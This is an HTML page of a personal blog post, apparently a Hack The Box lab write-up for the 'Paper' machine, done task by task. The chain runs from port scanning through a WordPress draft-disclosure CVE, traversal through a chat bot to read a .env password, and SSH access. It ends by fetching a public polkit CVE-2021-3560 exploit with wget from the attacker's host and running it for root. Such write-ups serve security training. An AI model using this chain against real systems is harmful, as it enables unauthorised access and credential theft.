<!doctype html>
<html lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="generator" content="Docusaurus v2.0.0-beta.6">
<link rel="alternate" type="application/rss+xml" href="/Blog/blog/rss.xml" title="Penetration Testing Journal Blog RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/Blog/blog/atom.xml" title="Penetration Testing Journal Blog Atom Feed"><title data-react-helmet="true">Paper | Penetration Testing Journal</title><meta data-react-helmet="true" name="twitter:card" content="summary_large_image"><meta data-react-helmet="true" property="og:url" content="https://danae-pan.github.io/Blog/blog/Paper"><meta data-react-helmet="true" name="docusaurus_locale" content="en"><meta data-react-helmet="true" name="docusaurus_tag" content="default"><meta data-react-helmet="true" property="og:title" content="Paper | Penetration Testing Journal"><meta data-react-helmet="true" name="description" content="Task 1"><meta data-react-helmet="true" property="og:description" content="Task 1"><meta data-react-helmet="true" property="og:type" content="article"><meta data-react-helmet="true" property="article:published_time" content="2025-04-06T21:16:41.470Z"><link data-react-helmet="true" rel="canonical" href="https://danae-pan.github.io/Blog/blog/Paper"><link data-react-helmet="true" rel="alternate" href="https://danae-pan.github.io/Blog/blog/Paper" hreflang="en"><link data-react-helmet="true" rel="alternate" href="https://danae-pan.github.io/Blog/blog/Paper" hreflang="x-default"><link rel="stylesheet" href="/Blog/assets/css/styles.4c3251a2.css">
<link rel="preload" href="/Blog/assets/js/runtime~main.ceabeab7.js" as="script">
<link rel="preload" href="/Blog/assets/js/main.aaae98ec.js" as="script">
</head>
<body>
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"dark")}()</script><div id="__docusaurus">
<div><a href="#" class="skipToContent_OuoZ">Skip to main content</a></div><nav class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Navigation bar toggle" class="navbar__toggle clean-btn" type="button" tabindex="0"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/Blog/"><b class="navbar__title">About Me</b></a><a class="navbar__item navbar__link" href="/Blog/docs/phases/Introduction">Guides</a><a class="navbar__item navbar__link" href="/Blog/blog/Jerry">Write Ups</a></div><div class="navbar__items navbar__items--right"><a class="navbar__item navbar__link" href="/Blog/docs/stories/Brain: the first computer virus">Bedtime Stories</a></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div class="main-wrapper blog-wrapper blog-post-page"><div class="container margin-vert--lg"><div class="row"><aside class="col col--3"><nav class="sidebar_q+wC thin-scrollbar" aria-label="Blog recent posts navigation"><div class="sidebarItemTitle_9G5K margin-bottom--md">Recent posts</div><ul class="sidebarItemList_6T4b"><li class="sidebarItem_cjdF"><a aria-current="page" class="sidebarItemLink_zyXk sidebarItemLinkActive_wcJs" href="/Blog/blog/Paper">Paper</a></li><li class="sidebarItem_cjdF"><a class="sidebarItemLink_zyXk" href="/Blog/blog/Devvortex">Devvortex</a></li><li class="sidebarItem_cjdF"><a class="sidebarItemLink_zyXk" href="/Blog/blog/Sau">Sau</a></li><li class="sidebarItem_cjdF"><a class="sidebarItemLink_zyXk" href="/Blog/blog/Jerry">Jerry</a></li><li class="sidebarItem_cjdF"><a class="sidebarItemLink_zyXk" href="/Blog/blog/GoodGames">GoodGames</a></li></ul></nav></aside><main class="col col--7" itemscope="" itemtype="http://schema.org/Blog"><article itemprop="blogPost" itemscope="" itemtype="http://schema.org/BlogPosting"><header><h1 class="blogPostTitle_d4p0" itemprop="headline">Paper</h1><div class="blogPostData_-Im+ margin-vert--md"><time datetime="2025-04-06T21:16:41.470Z" itemprop="datePublished">April 6, 2025</time> · 5 min read</div></header><div class="markdown" itemprop="articleBody"><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="task-1"></a>Task 1<a class="hash-link" href="#task-1" title="Direct link to heading">#</a></h3><p>How many TCP ports are open on the remote host?</p><p><code>nmap -sS &lt;target_ip&gt;</code></p><p><img alt="alt text" src="/Blog/assets/images/image-p-1-d23893e8bdd9381fd08d82682fa601cf.png"></p><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="task-2"></a>Task 2<a class="hash-link" href="#task-2" title="Direct link to heading">#</a></h3><p>What is the domain for the Wordpress blog?</p><p>For answering this, we will attempt checking the information coming from the headers. </p><p><code>curl -I &lt;target_ip&gt;</code></p><p><img alt="alt text" src="/Blog/assets/images/image-p-2-7221cf04b4960b24b208b606c281ddf0.png"></p><p>We can se that the server is leaking information from the backend systems from the X-Backend-Server header that contains the hostname of the target IP.</p><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="task-3"></a>Task 3<a class="hash-link" href="#task-3" title="Direct link to heading">#</a></h3><p>Which 2019 CVE is the wordpress version vulnerable to?</p><p>First, we need to identify the version of wordpress. First, we add the domain to the host file by <code>sudo vim /etc/hosts</code></p><p><img alt="alt text" src="/Blog/assets/images/image-p-3-61f0d3cc7ec0a2cc30019cd03d5893e6.png"></p><p>Then, we use wpscan, the WordPress security scanner, to find the version and any vulnerabilities. </p><p><img alt="alt text" src="/Blog/assets/images/image-p-4-311aec8fdcb7edd7fc8f2337c8afe033.png"></p><p>We found both the readme.html file location, which usually contains the wordpress version but the specific version was already identified. With a quick google search about the specific version we find the 2019 CVE.</p><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="task-4"></a>Task 4<a class="hash-link" href="#task-4" title="Direct link to heading">#</a></h3><p>What is the secret registration URL of the employee chat system?</p><p>We first need to enumerate the directories using gobuster dir.</p><p><code>gobuster dir -u http://office.paper/ -w &lt;word_list&gt;</code></p><p><img alt="alt text" src="/Blog/assets/images/image-p-5-9f04ccf1033dfa45b3a80c518fb56eb5.png"></p><p>Navigating to the index.php page we see some kind of chat system.</p><p><img alt="alt text" src="/Blog/assets/images/image-p-6-48216df3ac3a7de794a4d5ac8b930617.png"></p><p>Going back to the CVE we previously found, this version could allow an unauthenticated user to view private or draft posts. Navigating to the page we also find this interesting post by the user Prinsonmike. Seems that we can use this wordpress vulnerability to access his draft hoping we can find this secret url.</p><p><img alt="alt text" src="/Blog/assets/images/image-p-8-b48a3b57ae20b928f8913c109e1736c1.png"></p><p>We navigate <code>http://office.paper/?static=1</code> and exploit the vulnerability and find the secret url.</p><p><img alt="alt text" src="/Blog/assets/images/image-p-9-4d69abc44ef1bb79c90a4c069caace5d.png"></p><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="task-5"></a>Task 5<a class="hash-link" href="#task-5" title="Direct link to heading">#</a></h3><p>What is the name of the bot running on the Rocket Chat instance?</p><p>We need to first add to the hosts file the subdomain <code>chat.office.paper</code> so the ip get resolved. </p><p>Navigating to the secret url we found on the previous task we see the registration form.</p><p><img alt="alt text" src="/Blog/assets/images/image-p-10-7304dbaee416aa6458274a48fdd2e9c0.png"></p><p>We register, and the go to the general channel where we see the name of the bot.</p><p><img alt="alt text" src="/Blog/assets/images/image-p-11-fa8caaddef1019ec0d7735031f27a1cc.png"></p><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="task-6"></a>Task 6<a class="hash-link" href="#task-6" title="Direct link to heading">#</a></h3><p>Which recyclops commands allows listing files?</p><p>In the &quot;How to use me?&quot; guide of the bot we see all the commands, including the one listing files.</p><p><img alt="alt text" src="/Blog/assets/images/image-p-12-d4c13f83c2f0a2232856e3c2151eeb38.png"></p><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="task-7"></a>Task 7<a class="hash-link" href="#task-7" title="Direct link to heading">#</a></h3><p>What is the file name of the file that contains the configuration information of hubot running on the chat system?</p><p>Hubot is a framework to build chat bots. We will try to chat with recyclops, using the commands available to extract the information about the name of the file. Running <code>list</code> we see that we are on user dwight home directory. </p><p><img alt="alt text" src="/Blog/assets/images/image-p-15-2ac857edd93cf1cec5182061be6e7495.png"></p><p>We go back to the direcotry with <code>list ../</code> and then list the directory hubot <code>list ../hubot</code>.</p><p><img alt="alt text" src="/Blog/assets/images/image-p-16-80dc6b0c6547360b9d7e78cfd01b4b48.png"></p><p>Looking through the listed files and google searching hubot documentation to cross-reference, we see some files that could be possible like <code>.env</code> and <code>external-scripts</code>. We see their contents, first <code>file ../hubot/external-scripts.json</code> is empty and then <code>file ../hubot/.env</code> is the one containing the configuration.</p><p><img alt="alt text" src="/Blog/assets/images/image-p-17-cefb8c1c6014835d58f8188291472f69.png"></p><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="task-8"></a>Task 8<a class="hash-link" href="#task-8" title="Direct link to heading">#</a></h3><p>What is the password obtained from that configuration information?</p><p>From the <code>.env</code> file we obtained from the previous question, we find the password. </p><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="task-9"></a>Task 9<a class="hash-link" href="#task-9" title="Direct link to heading">#</a></h3><p>Which regular user with a home directory exists on Paper other than rocketchat?</p><p>From the previous tasks, we saw that we where on the regular user dwight directory.</p><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="task-10"></a>Task 10<a class="hash-link" href="#task-10" title="Direct link to heading">#</a></h3><p>Submit the flag located in the dwight user&#x27;s home directory.</p><p>Previously, when we listed the home directory, by running <code>list ../</code> we came accross the <code>user.txt</code> file. We try to see the contents and get the user flag by <code>file ../user.txt</code> but we get access denied. We try to ssh to the target ip with the username dwight <code>ssh dwight@&lt;target_ip</code> and the password we found in the <code>.env</code> file and we are in! We get the user flag by <code>cat user.txt</code>.</p><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="task-11"></a>Task 11<a class="hash-link" href="#task-11" title="Direct link to heading">#</a></h3><p>What is the polkit version on the remote host?</p><p>We first run <code>cat /etc/os-release</code> to find which os we are on and we see that we are on CentOS. Then we can run <code>rpm -qa | grep polkit
</code> to find the version of polkit.</p><p><img alt="alt text" src="/Blog/assets/images/image-p-18-bb49644762a1bab9752b51f91f253f55.png">
<img alt="alt text" src="/Blog/assets/images/image-p-19-a615991ddbe7d98e2868a4515644040b.png"></p><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="task-12"></a>Task 12<a class="hash-link" href="#task-12" title="Direct link to heading">#</a></h3><p>What is the 2021 CVE ID for the vulnerability in this version of polkit related to bypassing credential checks for D-Bus requests?</p><p>Looking up for CVEs affecting the version of the polkit found, we find CVE-2021-3560 for the vulnerability that allows an unprivileged user to create an administrative user without authentication by abusing D-Bus and timing. </p><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="task-13"></a>Task 13<a class="hash-link" href="#task-13" title="Direct link to heading">#</a></h3><p>In our machine, we clone the exploit from github <a href="https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation" target="_blank" rel="noopener noreferrer">https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation</a>. Then, we open a http server on port 8080 using <code>python3 -m http.server 8080</code>. From the remote server, we use wget to get the exploit script <code>wget http://&lt;host_ip&gt;:8080/poc.sh</code>. We then <code>chmod +x poc.sh</code> and run the exploit as many times as needed to get the timing right. We follow the exploit&#x27;s instruction and get a root shell as the secnigma user. </p><p>We navigate to the root directory and obtain the root flag by <code>cat root.txt</code></p><p><img alt="alt text" src="/Blog/assets/images/image-p-20-d4449895b688d00017627e8a6ce3c5d0.png"></p></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Blog post page navigation"><div class="pagination-nav__item"></div><div class="pagination-nav__item pagination-nav__item--next"><a class="pagination-nav__link" href="/Blog/blog/Devvortex"><div class="pagination-nav__sublabel">Older Post</div><div class="pagination-nav__label">Devvortex »</div></a></div></nav></main><div class="col col--2"><div class="tableOfContents_vrFS thin-scrollbar"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#task-1" class="table-of-contents__link">Task 1</a></li><li><a href="#task-2" class="table-of-contents__link">Task 2</a></li><li><a href="#task-3" class="table-of-contents__link">Task 3</a></li><li><a href="#task-4" class="table-of-contents__link">Task 4</a></li><li><a href="#task-5" class="table-of-contents__link">Task 5</a></li><li><a href="#task-6" class="table-of-contents__link">Task 6</a></li><li><a href="#task-7" class="table-of-contents__link">Task 7</a></li><li><a href="#task-8" class="table-of-contents__link">Task 8</a></li><li><a href="#task-9" class="table-of-contents__link">Task 9</a></li><li><a href="#task-10" class="table-of-contents__link">Task 10</a></li><li><a href="#task-11" class="table-of-contents__link">Task 11</a></li><li><a href="#task-12" class="table-of-contents__link">Task 12</a></li><li><a href="#task-13" class="table-of-contents__link">Task 13</a></li></ul></div></div></div></div></div><footer class="footer footer--dark"><div class="container"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Contact</div><ul class="footer__items"><li class="footer__item"><a href="https://github.com/danae-pan" target="_blank" rel="noopener noreferrer" class="footer__link-item"><span>GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_wgqa"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></span></a></li><li class="footer__item"><a href="https://linkedin.com/in/anastasia-danai-panagiotopoulou" target="_blank" rel="noopener noreferrer" class="footer__link-item"><span>LinkedIn<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_wgqa"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></span></a></li></ul></div></div><div class="footer__bottom text--center"></div></div></footer></div>
<script src="/Blog/assets/js/runtime~main.ceabeab7.js"></script>
<script src="/Blog/assets/js/main.aaae98ec.js"></script>
</body>
</html>